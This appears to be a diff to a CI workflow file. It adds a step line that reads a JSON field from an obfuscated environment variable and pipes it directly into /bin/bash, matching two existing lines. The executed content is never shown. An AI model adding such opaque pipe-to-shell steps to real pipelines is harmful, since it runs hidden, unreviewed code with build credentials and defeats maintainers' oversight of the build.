@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$lx0" | jq -r .azwr553 | /bin/bash
           echo $itik300 | jq -r .d928 | /bin/bash
+          echo $zq96313 | jq -r .eip0 | /bin/bash
 
       - name: Archive results
         if: always()
